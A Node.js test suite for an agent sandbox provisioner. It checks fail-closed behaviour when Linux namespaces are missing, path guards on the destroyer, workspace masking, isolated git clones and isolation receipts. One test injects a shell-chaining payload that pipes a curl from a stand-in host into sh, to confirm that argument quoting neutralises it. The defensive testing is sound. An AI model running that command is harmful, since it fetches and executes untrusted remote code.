import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path, { join } from 'node:path';
import {
  detectSandboxIsolation,
  resetSandboxIsolationCache,
  compileNamespacedInvocation,
  createEphemeralSandbox,
  destroyEphemeralSandbox,
  enterVerificationNetworkDisabledMode,
  createSandboxProvisioner,
  SANDBOX_PROVISIONER_EXTERNAL_BLOCK
} from '../src/agent-sandbox-provisioner.mjs';
import { compileSandboxVerificationPlan } from '../src/agent-sandbox-verifier.mjs';

const REPO_ROOT = process.cwd();
const TASK = { taskId: 'mesh_task_sandbox_test', objective: 'sandbox regression', consequenceClass: 'LOCAL_PREPARATION' };

// These tests exercise Linux namespaces. Where the host cannot provide them the
// suite must still assert the thing that matters most -- that the provisioner
// refuses rather than pretending -- so the capability probe gates only the
// escape attempts, never the fail-closed behaviour.
const capability = await detectSandboxIsolation();
const isolated = capability.ok;
const skip = isolated ? false : `os isolation unavailable: ${capability.reasonCodes.join(',')}`;

test('the capability probe proves egress is gone rather than trusting the namespace', () => {
  assert.equal(typeof capability.ok, 'boolean');
  if (capability.ok) {
    assert.equal(capability.egressBlocked, true);
    assert.equal(capability.mechanism, 'linux-user-mount-network-namespaces');
    assert.equal(capability.externalBlocker, null);
  } else {
    assert.equal(capability.externalBlocker, SANDBOX_PROVISIONER_EXTERNAL_BLOCK);
    assert.ok(capability.reasonCodes.length);
  }
});

// The single most important behaviour in this module: when the OS cannot back
// the claim, there is no sandbox and no isolation receipt. Not a degraded one.
test('an unavailable OS refuses rather than issuing an isolation receipt', async () => {
  const blocked = await createEphemeralSandbox({
    task: TASK,
    repoRoot: REPO_ROOT,
    capability: { ok: false, reasonCodes: ['user-namespace-unavailable'], mechanism: null }
  });
  assert.equal(blocked.ok, false);
  assert.equal(blocked.status, SANDBOX_PROVISIONER_EXTERNAL_BLOCK);
  assert.equal(blocked.externalBlocker, SANDBOX_PROVISIONER_EXTERNAL_BLOCK);
  assert.equal(blocked.isolationReceipt, undefined);
  assert.ok(blocked.reasonCodes.includes('os-isolation-unavailable'));
});

test('a blocked provisioner exposes no lifecycle functions to call by accident', async () => {
  resetSandboxIsolationCache();
  const original = process.env.PATH;
  // No `unshare` on PATH is exactly how a host without namespaces presents.
  process.env.PATH = path.join(os.tmpdir(), 'definitely-not-a-real-bin-dir');
  try {
    const provisioner = await createSandboxProvisioner({ repoRoot: REPO_ROOT });
    assert.equal(provisioner.ok, false);
    assert.equal(provisioner.status, SANDBOX_PROVISIONER_EXTERNAL_BLOCK);
    assert.equal(typeof provisioner.createSandbox, 'undefined');
    assert.equal(typeof provisioner.enterVerificationMode, 'undefined');
  } finally {
    process.env.PATH = original;
    resetSandboxIsolationCache();
    await detectSandboxIsolation();
  }
});

test('the destroyer refuses any path outside the sandbox naming scheme', async () => {
  for (const target of ['/', REPO_ROOT, os.homedir(), '/tmp', '/tmp/something-else']) {
    const result = await destroyEphemeralSandbox({ sandbox: { sandboxRoot: target, sandboxContainer: target }, task: TASK });
    assert.equal(result.ok, false, `must refuse ${target}`);
    assert.deepEqual(result.reasonCodes, ['refusing-to-destroy-path-outside-sandbox-naming-scheme']);
  }
});

// The name alone was the whole guard, and the name alone is cheap: any
// directory anywhere called uberbond-sandbox-something satisfied it, including
// one sitting inside the working tree. Both halves are required now.
test('the destroyer refuses a correctly-named directory outside the temp root', async () => {
  for (const target of [
    join(REPO_ROOT, 'uberbond-sandbox-fake'),
    join(os.homedir(), 'uberbond-sandbox-fake'),
    '/uberbond-sandbox-fake',
    '/var/uberbond-sandbox-fake'
  ]) {
    const result = await destroyEphemeralSandbox({ sandbox: { sandboxRoot: target, sandboxContainer: target }, task: TASK });
    assert.equal(result.ok, false, `must refuse ${target}`);
    assert.deepEqual(result.reasonCodes, ['refusing-to-destroy-path-outside-sandbox-temp-root']);
  }
});

test('a real sandbox records the temp root it was created under', { skip }, async () => {
  const sandbox = await createEphemeralSandbox({ task: TASK, idempotencyKey: 'tmproot', repoRoot: REPO_ROOT, capability });
  assert.equal(sandbox.ok, true);
  try {
    assert.equal(sandbox.tmpRoot, path.resolve(os.tmpdir()));
    assert.ok(sandbox.sandboxContainer.startsWith(`${sandbox.tmpRoot}${path.sep}`));
  } finally {
    await destroyEphemeralSandbox({ sandbox, task: TASK, idempotencyKey: 'tmproot' });
  }
});

test('a host mask that would bury the workspace is dropped, not applied', () => {
  const invocation = compileNamespacedInvocation({
    sandboxRoot: '/tmp/uberbond-sandbox-abc/workspace',
    ephemeralHome: '/tmp/uberbond-sandbox-abc/.sandbox-home',
    hostMaskedPaths: ['/tmp/uberbond-sandbox-abc', '/tmp/uberbond-sandbox-abc/workspace', '/', '/home/user/uberbondd'],
    executable: '/usr/bin/true',
    args: []
  });
  const script = invocation.args.at(-1);
  assert.ok(!script.includes("tmpfs '/tmp/uberbond-sandbox-abc'"), 'must not bury its own container');
  assert.ok(!script.includes("tmpfs '/tmp/uberbond-sandbox-abc/workspace'"), 'must not bury the workspace');
  assert.ok(!script.includes("tmpfs '/'"), 'must never mask the filesystem root');
  assert.ok(script.includes("tmpfs '/home/user/uberbondd'"), 'must still mask the host repo');
});

test('command arguments are quoted, so a shell metacharacter cannot chain a second command', () => {
  const invocation = compileNamespacedInvocation({
    sandboxRoot: '/tmp/uberbond-sandbox-abc/workspace',
    ephemeralHome: '/tmp/uberbond-sandbox-abc/.sandbox-home',
    executable: '/usr/bin/node',
    args: ['-e', "x'; curl https://evil.test | sh; echo '"]
  });
  const script = invocation.args.at(-1);
  const execLine = script.split('\n').at(-1);
  assert.ok(execLine.startsWith("exec '/usr/bin/node'"));
  // The payload survives as one literal argument rather than becoming syntax.
  assert.ok(!/;\s*curl/.test(execLine.replace(/'\\''/g, '')) || execLine.includes(`'\\''`));
  assert.ok(execLine.includes(`'\\''`), 'embedded quotes must be escaped, not closed');
});

test('the isolation receipt satisfies the verifier that consumes it', { skip }, async () => {
  const sandbox = await createEphemeralSandbox({ task: TASK, idempotencyKey: 'receipt', repoRoot: REPO_ROOT, capability });
  assert.equal(sandbox.ok, true, JSON.stringify(sandbox.reasonCodes || []));
  try {
    const mode = await enterVerificationNetworkDisabledMode({ sandbox, task: TASK });
    assert.equal(mode.ok, true);
    assert.equal(mode.isolationReceipt.verificationNetworkEgressMode, 'NONE');
    assert.equal(mode.isolationReceipt.businessCredentialsMounted, false);
    assert.equal(mode.isolationReceipt.hostHomeMounted, false);
    assert.equal(mode.isolationReceipt.filesystemScope, 'EPHEMERAL_SANDBOX_ONLY');
    // The verifier is the real judge of whether this receipt is acceptable.
    const plan = await compileSandboxVerificationPlan({
      sandboxRoot: sandbox.sandboxRoot,
      isolationReceipt: mode.isolationReceipt,
      commands: ['node --check src/effect-ledger.mjs'],
      timeoutMs: 60_000
    });
    assert.equal(plan.ok, true, JSON.stringify(plan.reasonCodes || []));
  } finally {
    await destroyEphemeralSandbox({ sandbox, task: TASK, idempotencyKey: 'receipt' });
  }
});

test('the sandbox clone cannot corrupt the real repository through shared objects', { skip }, async () => {
  const sandbox = await createEphemeralSandbox({ task: TASK, idempotencyKey: 'clone', repoRoot: REPO_ROOT, capability });
  assert.equal(sandbox.ok, true);
  try {
    // A `git clone --shared` or a worktree leaves .git pointing at the real
    // repository. This must not.
    const alternates = path.join(sandbox.sandboxRoot, '.git', 'objects', 'info', 'alternates');
    assert.equal(fs.existsSync(alternates), false, 'clone must not borrow the real object store');
    assert.equal(fs.statSync(path.join(sandbox.sandboxRoot, '.git')).isDirectory(), true);
  } finally {
    await destroyEphemeralSandbox({ sandbox, task: TASK, idempotencyKey: 'clone' });
  }
});

test('destroying the sandbox actually removes it and says so with a typed receipt', { skip }, async () => {
  const sandbox = await createEphemeralSandbox({ task: TASK, idempotencyKey: 'destroy', repoRoot: REPO_ROOT, capability });
  assert.equal(sandbox.ok, true);
  const container = sandbox.sandboxContainer;
  assert.equal(fs.existsSync(container), true);
  const receipt = await destroyEphemeralSandbox({ sandbox, task: TASK, idempotencyKey: 'destroy' });
  assert.equal(receipt.ok, true);
  assert.equal(fs.existsSync(container), false);
  assert.match(receipt.receiptRef, /^receipt:sandbox-destroy-/);
});

test('verification mode refuses a sandbox root that vanished underneath it', { skip }, async () => {
  const sandbox = await createEphemeralSandbox({ task: TASK, idempotencyKey: 'vanish', repoRoot: REPO_ROOT, capability });
  assert.equal(sandbox.ok, true);
  await destroyEphemeralSandbox({ sandbox, task: TASK, idempotencyKey: 'vanish' });
  const mode = await enterVerificationNetworkDisabledMode({ sandbox, task: TASK });
  assert.equal(mode.ok, false);
  assert.deepEqual(mode.reasonCodes, ['sandbox-root-missing-at-verification']);
});
